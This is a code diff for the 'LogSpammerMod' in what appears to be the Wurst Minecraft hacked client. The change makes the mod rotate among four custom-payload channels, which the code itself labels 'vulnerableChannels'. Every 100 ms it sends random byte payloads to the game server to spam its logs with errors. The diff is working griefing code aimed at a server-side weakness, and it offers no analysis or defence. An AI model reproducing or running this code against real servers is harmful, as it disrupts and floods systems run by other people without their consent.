@@ -59,16 +59,17 @@ import tk.wurst_client.utils.RenderUtils;
 public class LogSpammerMod extends Mod implements UpdateListener {
 	private PacketBuffer payload;
 	private Random random;
+	private final String[] vulnerableChannels = new String[] { "MC|BEdit", "MC|BSign", "MC|TrSel", "MC|Beacon" };
 
 	@Override
 	public void onEnable() {
 		random = new Random();
 		payload = new PacketBuffer(Unpooled.buffer());
-		
+
 		byte[] rawPayload = new byte[random.nextInt(128)];
 		random.nextBytes(rawPayload);
 		payload.writeBytes(rawPayload);
-		
+
 		updateMS();
 		wurst.events.add(UpdateListener.class, this);
 	}
@@ -76,7 +77,8 @@ public class LogSpammerMod extends Mod implements UpdateListener {
 	@Override
 	public void onUpdate() {
 		if (hasTimePassedM(100)) {
-			mc.thePlayer.sendQueue.addToSendQueue(new CPacketCustomPayload("MC|BSign", payload));
+			mc.thePlayer.sendQueue.addToSendQueue(
+					new CPacketCustomPayload(vulnerableChannels[random.nextInt(vulnerableChannels.length)], payload));
 			updateMS();
 		}
 	}
